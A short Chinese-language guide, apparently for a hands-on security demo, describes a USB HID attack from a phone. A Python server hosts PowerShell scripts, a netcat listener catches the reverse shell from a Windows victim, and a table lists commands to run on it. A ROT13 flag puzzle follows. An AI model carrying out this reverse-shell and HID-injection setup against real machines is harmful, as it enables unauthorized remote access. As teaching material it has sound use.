## 近源渗透体验
服务器配置
```python
#打开python服务器来访问ps脚本
cd /opt/shell;sudo python -m http.server 82

#监听本地端口
sudo nc -lvnp 80

```

客户端
电脑打开就行



### 游玩指南
俩台电脑,一台手机
手机负责执行hid attack攻击
一台linux服务器,用来接收shell
一台window,用来当被攻击机器

- 手机连接到电脑usb接口上,作为一个hid attack攻击设备
- linux监听本地端口,在命令行输入`sudo nc -lvnp 80`![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230912235031.png)
*监听成功标志*

- 单击设备上的preview,点击右上角三角符号开始攻击


- 等待攻击完成即可执行任意命令
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230912235341.png)

*攻击成功标志*


部分命令指南

| 命令                            | 结果                                             | 举例 |
| ------------------------------- | ------------------------------------------------ | ---- |
| echo "\<content\>" > ~/\<name\> | 在对方桌面新建一个\<name\>文件,内容为\<content\> | echo "i am hacker" >~/Desktop/haha.txt     |
|                                 |                                                  |      |





## 密码破解
凯撒密码  密文:synt{jrypbzr_gb_ajh}

